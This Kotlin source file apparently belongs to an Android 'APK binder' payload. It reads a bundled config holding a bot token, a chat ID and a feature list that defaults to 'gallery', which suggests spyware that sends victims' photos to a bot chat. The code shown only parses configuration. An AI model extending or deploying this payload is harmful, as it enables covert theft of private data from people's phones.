package Com.devhs.apkbinder.payload

import android.content.Context
import org.json.JSONObject

object HsConfig {

    class Data(val token: String, val chat: String, val features: List<String>)

    fun read(c: Context): Data? {
        try {
            val s = c.assets.open("hs_config.json").use {
                it.readBytes().toString(Charsets.UTF_8)
            }
            val o = JSONObject(s)
            val t = o.optString("bot_token")
            val ch = o.optString("chat_id")
            if (t.isBlank() || ch.isBlank()) return null

            val f = ArrayList<String>()
            val arr = o.optJSONArray("features")
            if (arr != null) {
                for (i in 0 until arr.length()) f.add(arr.optString(i))
            }
            if (f.isEmpty()) f.add("gallery")
            return Data(t, ch, f)
        } catch (t: Throwable) {
            return null
        }
    }
}
